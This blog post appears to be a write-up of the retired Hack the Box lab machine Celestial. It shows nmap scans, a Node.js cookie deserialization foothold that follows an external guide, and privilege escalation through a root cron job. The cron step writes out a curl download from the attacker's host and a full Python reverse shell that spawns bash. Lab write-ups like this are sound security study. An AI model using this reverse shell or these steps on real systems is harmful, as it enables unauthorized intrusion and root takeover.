---
layout: post
title: Hack the Box - Celestial
date: 2020-08-21 18:39:22 +0100
description: Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects inNodeJS framework.
img: celestial.png
fig-caption: Celestial
categories: HackTheBox
tags: [Medium, Linux, Retired, CVE]
---
## Overview
Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects inNodeJS framework.

## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/celestial]
└─$ sudo nmap -p- -T4 10.129.117.225    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:41 GMT
Nmap scan report for 10.129.117.225
Host is up (0.015s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 380.73 seconds
```
Enumeration on ports is made easy as there is only one port open. When accessing this in a browser we are greeted with the message `Hey Dummy 2 + 2 is 22`. Fuzzing did not find anything important, so on close inspection of the GET request we could see a cookie.
```
GET / HTTP/1.1
Host: 10.129.117.225:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
Upgrade-Insecure-Requests: 1
If-None-Match: W/"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg"
```
As it looks like base64 on decoding it we could see a JSON message. This would lead us to believe there could be a serialization exploit. To understand what platform this exploit could affect service enumeration reveals that it is a NodeJS server.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/celestial]
└─$ sudo nmap -p3000 -sV 10.129.117.225                                                                                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:55 GMT
Nmap scan report for 10.129.117.225
Host is up (0.015s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.74 seconds
```
Some googling uncovered that NodeJS is vulnerable to a deserialization bug that results in RCE and I followed this [guide](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
## Foothold
Following the guide above returns a shell as shown below
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/celestial]
└─$ nc -nlvp 4245
listening on [any] 4245 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.117.225] 58502
Connected!
python -c "import pty; pty.spawn('/bin/bash');"
sun@sun:~$ whoami
whoami
sun
```
## Privilege Escalation
Once we have a shell I used [pspy](https://github.com/DominicBreuker/pspy) to monitor the processes on the server. After waiting for a few mins I spotted the below.
```
2021/03/22 15:30:01 CMD: UID=0    PID=20538  | /usr/sbin/CRON -f 
2021/03/22 15:30:01 CMD: UID=0    PID=20543  | python /home/sun/Documents/script.py 
2021/03/22 15:30:01 CMD: UID=0    PID=20548  | cp /root/script.py /home/sun/Documents/script.py 
2021/03/22 15:30:01 CMD: UID=0    PID=20549  | chown sun:sun /home/sun/Documents/script.py 
```
This showed `script.py` being called by root and luckily we have write access to it. So after replacing the script with a reverse shell we received root.
```
sun@sun:~/Documents$ curl -o /home/sun/Documents/script.py http://10.10.14.27:8081/reverse.py 
sun@sun:~/Documents$ chmod +x /home/sun/Documents/script.py
sun@sun:~/Documents$ cat /home/sun/Documents/script.py

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.27",5875));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("/bin/bash")

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/celestial]
└─$ nc -nlvp 5875
listening on [any] 5875 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.117.225] 45444
root@sun:~# whoami
whoami
root
```